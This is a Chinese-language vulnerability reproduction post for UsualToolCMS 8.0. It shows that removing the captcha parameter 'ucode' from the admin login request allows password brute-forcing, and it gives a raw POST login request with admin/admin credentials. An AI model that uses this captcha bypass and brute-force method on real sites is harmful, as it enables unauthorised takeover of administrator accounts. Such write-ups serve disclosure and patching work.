# UsualToolcms 8.0 绕过后台验证码爆破

> 原文：[https://www.zhihuifly.com/t/topic/3213](https://www.zhihuifly.com/t/topic/3213)

# UsualToolcms 8.0 绕过后台验证码爆破

## 一、漏洞简介

可通过删除验证码参数，进行暴力破解

## 二、漏洞影响

UsualToolCMS-8.0-Release

## 三、复现过程

漏洞点:http://0-sec.org/cmsadmin/

后台登陆时默认需要输入验证码，但是当我把验证码的参数ucode删除时，登陆依然成功

### 1.默认情况下登陆数据包

![image](img/250b1e5c16a8b1a1fcf0f7aa2c0de690.png)

![image](img/a857dbb5b18178eef37dd959b4af47b3.png)

删除ucode参数和cookie后登陆，直接登陆成功

![image](img/7936caa942376a10b97129709f537d25.png)

通过burp爆破后台密码

![image](img/e443447827b378eff17bde253f8566a4.png)

![image](img/b7bf1c45faf4a461fe71fef70e5492d8.png)

```
POST /UsualToolCMS/cmsadmin/a_login.php?do=login HTTP/1.1
Host: 0-sec.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_login.php
X-Forwarded-For: 8.8.8.8
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 23 `uuser=admin&upass=admin` 
```